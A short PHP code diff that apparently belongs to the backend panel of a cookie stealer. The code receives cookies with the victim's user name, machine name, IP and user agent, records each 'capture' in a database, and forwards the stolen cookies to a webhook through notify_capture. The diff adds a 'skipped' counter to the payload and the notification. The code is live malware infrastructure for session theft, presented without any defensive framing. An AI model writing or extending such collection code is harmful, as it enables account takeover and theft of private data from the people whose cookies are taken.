@@ -63,6 +63,7 @@ $payload = json_encode([
     'user' => $suser,
     'machine' => $machine,
     'at' => $at,
+    'skipped' => (int)($body['skipped'] ?? 0),
     'cookies' => $clean,
 ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
 
@@ -74,6 +75,6 @@ $stmt->execute([$tag, $app, $suser, $machine, $ip, $agent, count($clean), $at, n
 
 $conf = panel_conf();
 $hook = trim((string)(setting('webhook', (string)($conf['webhook'] ?? '')) ?? ''));
-notify_capture($hook, $tag, $app, $suser, $machine, $ip, $clean);
+notify_capture($hook, $tag, $app, $suser, $machine, $ip, $clean, (int)($body['skipped'] ?? 0));
 
 json_out(['ok' => true, 'count' => count($clean)]);
